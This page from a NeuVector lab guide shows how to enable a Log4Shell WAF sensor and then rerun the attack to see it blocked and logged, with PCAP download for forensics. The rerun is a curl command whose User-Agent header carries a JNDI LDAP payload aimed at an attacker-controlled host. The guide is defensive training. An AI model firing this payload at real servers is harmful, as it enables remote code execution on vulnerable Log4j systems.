+++
title = "Add WAF rule"
weight = 22
+++

NeuVector's deep packet inspection also allow to scan and filter incoming and outgoing traffic with WAF (Web Application Firewall) and DLP (Data Loss Prevention) sensors.

Go to **Policy > WAF Sensors** to see the already pre-configured sensors. Here you can also activate your own. You can find more information at [DLP & WAF Sensors](https://open-docs.neuvector.com/policy/dlp).

To create a WAF rule that blocks the request from even reaching the sample-app

* Go to **Policy > Groups** and choose the `nv.sample-app.default` group.
* Go to the **WAF** tab
* Click on the edit button
* Choose the Log4Shell WAF sensor
* Click apply
* Set the WAF status toggle to **Enabled**

Run the attack again

**Run the following commands on the victim01 VM.**

```ctr
curl http://sample-app.default.${vminfo:victim01:public_ip}.sslip.io/login -d "uname=test&password=invalid" -H 'User-Agent: ${jndi:ldap://${vminfo:attacker01:public_ip}:1389/a}'
```

The request will be blocked. You can see a WAF alert under **Notifications > Security Events**.

For further forensics, you can download a package capture PCAP file directly from the alert.

You can now open this file in any tool that supports PCAP files, for example [Wireshark](https://www.wireshark.org/).
